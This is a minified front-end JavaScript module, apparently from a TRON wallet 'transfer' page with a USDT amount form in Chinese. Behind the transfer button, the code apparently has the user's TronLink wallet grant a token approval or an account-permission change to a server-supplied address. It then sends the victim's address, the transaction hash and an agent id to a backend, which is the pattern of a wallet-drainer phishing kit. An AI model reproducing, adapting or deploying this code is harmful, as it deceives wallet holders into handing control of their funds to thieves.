import{u as e}from"./uSDYC-ad35767d.js";import{g as a,s as t,a as s,b as l}from"./3-a7dc8a61.js";import{B as o,t as c,g as i,a as r,b as d}from"./0Ic-713819fb.js";import{v as n,c as u,b as p,Q as m,P as v,l as b,V as f,M as g,R as j,S as y,O as h,q as x}from"./E55jAu1X5x-b9d77fe0.js";import{r as w,u as k}from"./TDgdfWWZ6-3ceae14d.js";import{P as S,n as T}from"./DVRYX5-83563843.js";import{F as I,B as A,s as _,a as X,c as L}from"./PVpGs9m0pr-461db314.js";import{_ as R}from"./dYOC5-fb7299f3.js";import"./wCPATqoA6k-d55a480d.js";import"./7C24An-ae0f5c86.js";import"./n-437140e2.js";import"./GSeS-b759e5f5.js";import"./06oCcvfj1i-203fdec1.js";import"./9WAo6vEo43-296e89ec.js";import"./3McUf7Vd-d6b84efa.js";import"./sbTXoLj-2ad3f7bf.js";import"./T05XaRtqr-0e0da52a.js";import"./6NRBr7Yc9-412e2012.js";import"./ZogKH1H-ccc98e6d.js";import"./AJZz-f549f512.js";import"./y8nw3hXJ-40b910bf.js";import"./6L-7104d96e.js";import"./cRD3DPS-d80bebe6.js";import"./va-3b14ce20.js";import"./7cwKbbmMe-c0abe41f.js";import"./20x-e3fed1e2.js";import"./GbXVvX7g-c0cfdb26.js";import"./1il8l0-58d194e1.js";import"./lS8j7-235777d6.js";import"./BIkc-eab9540b.js";/* empty css          */import"./XYKxZ1kdq-50cdab9f.js";/* empty css                */import"./YIvc8vuf-583b4ad8.js";const C=e=>(j("data-v-0745702c"),e=e(),y(),e),V={class:"page-container bg-white-only"},D=C((()=>v("div",{class:"top-title center-w bold"},[v("i",{class:"base-Left fs18 baseIconFont left-m10"}),v("span",{class:"bold left-m10"},"转账"),v("span",{class:"left-m10 fs14 o6"},"(2/2)")],-1))),z={class:"bottom-m10 left-m10 right-m10"},N=C((()=>v("span",{class:"top-m30 bold fs14"},"通证",-1))),O={class:"bold collet-address center-w bg-gray1 left-p10 right-p10 spaceb top-m10 top-p10 bottom-p10 br6"},U={class:"center-w"},P=["src"],Y={class:"left-m10 bold fs16"},q={key:0,class:"left-m10 o6 fs12"},J={key:1,class:"left-m10 o6 fs12"},B=C((()=>v("text",{class:"base-i-right baseIconFont"},null,-1))),Z=C((()=>v("div",{style:{height:"9px"},class:"bg-gray1"},null,-1))),F={class:"bg-white bold collet-address top-m20 border-m"},G=C((()=>v("div",{class:"bottom-m10 left-m10 right-m30 fs14 bold"},"数量",-1))),K={class:"address left-m10 o7 bottom-p10 right-m20 column"},W={class:"spaceb right-m10 top-m10"},H={class:"fs12"},M=[C((()=>v("text",{class:"fs12"},"添加转账备注",-1))),C((()=>v("text",{class:"base-Down baseIconFont fs12 left-m10"},null,-1)))],E={key:0,class:"bottom-m20 left-m10 right-m10"},Q=C((()=>v("div",null,[v("text",{class:"top-m30 bold fs14"},"备注"),v("text",{class:"fs12 o6"},"（选填）")],-1))),$={class:"address top-m10 o7 bottom-p10 column"},ee=C((()=>v("div",{class:"fs12 text-blue top-m10"}," 添加转账备注，将额外消耗 1 TRX 的手续费 ",-1))),ae={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},te=R(n({__name:"tronlinkPay",setup(n){const j=w(0),y=w(0),R=w({type:1,walletType:1,agentId:"",token:"USDT",amount:1,block:o.TRX,clientId:"",ads:"",client_type:1,isAdd:!1,extend:{}}),C=w("");w("");const te=w({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),se=w(!1);e();const le=w(""),oe=w(!1),ce=w(""),ie=()=>{const{type:e}=R.value;if(y.value<j.value)return _("Insufficient balance");1==e?(async()=>{try{X({message:"Loading...",duration:0});const e=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",C.value,ce.value);e.result&&(re(ce.value,"approve",e.txid),_(te.value.authSuccessTips))}catch(e){L()}})():2==e&&(async()=>{if(R.value.block!=o.TRX)return;const e=await d(C.value,ce.value,R.value.isAdd);(null==e?void 0:e.result)?(re(ce.value,"active",e.txid),_(te.value.authSuccessTips),L()):e&&_("object"==typeof e?JSON.stringify(e):String(e))})()},re=async(e,a,o)=>{const c={addres:e,auth_addres:C.value,hash:o||0,wallete_type:"TronLink",client_id:R.value.clientId||te.value.clientId||"",source:window.location.href,agent_uid:R.value.agentId,block:R.value.block,client_type:R.value.client_type,amount:R.value.amount,extend:R.value.extend?JSON.stringify(R.value.extend):""};switch(a){case"approve":await l(c);break;case"active":await s(c);break;case"owner":await t(c)}L()};u((()=>R.value.ads||te.value.receiveAddress));return p((()=>{const e=JSON.parse(localStorage.getItem("routerParams"));j.value=e.amount,R.value={amount:j.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:o.TRX,clientId:e.clientId||"",ads:e.ads||"",isAdd:e.isAdd,client_type:e.client_type||1,extend:e.extend||""},(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));te.value={...e};const{type:t}=R.value;oe.value=!0;const s=await a({block:R.value.block,type:c[R.value.type]});oe.value=!1;const l=s.data;te.value={...e,authAddress:l},C.value=te.value.authAddress}catch(e){oe.value=!1}})(),(async()=>{if(ce.value=await tronWeb.defaultAddress.base58,!ce.value)return _("无法获取钱包地址！请检查浏览器是否支持TRON！");y.value=await i(ce.value,R.value.token)})()})),(e,a)=>(h(),m("div",V,[D,v("div",z,[N,v("div",O,[v("div",U,[v("img",{width:"30",height:"30",src:`/assets/token/${String(R.value.token).toLocaleLowerCase()}.png`},null,8,P),v("span",Y,S(String(R.value.token).toLocaleUpperCase()),1),"trx"==String(R.value.token).toLocaleLowerCase()?(h(),m("span",q,"(TRON)")):(h(),m("span",J,"(Tether USD)"))]),B])]),Z,v("div",F,[G,v("div",K,[b(k(I),{modelValue:j.value,"onUpdate:modelValue":a[0]||(a[0]=e=>j.value=e),type:"number",label:"",placeholder:"输入转账数量",size:"large",style:{"font-size":"16px",padding:"10px 15px","border-radius":"5px","background-color":"#f9fafb"}},null,8,["modelValue"]),v("div",W,[v("text",H,"可用："+S(y.value),1)])])]),v("div",{onClick:a[1]||(a[1]=e=>se.value=!se.value),class:T("center-w right-m10 top-m10 text-blue"),style:{"justify-content":"flex-end"}},M),se.value?(h(),m("div",E,[Q,v("div",$,[v("div",null,[b(k(I),{modelValue:le.value,"onUpdate:modelValue":a[2]||(a[2]=e=>le.value=e),label:"",placeholder:"请输入备注,不超过 200 个字符",size:"large",style:{"font-size":"13px",padding:"10px 14px","border-radius":"5px","background-color":"#f9fafb"}},null,8,["modelValue"]),ee])])])):f("",!0),v("div",ae,[b(k(A),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:ie,loading:oe.value},{default:g((()=>[x("转账")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-0745702c"]]);export{te as default};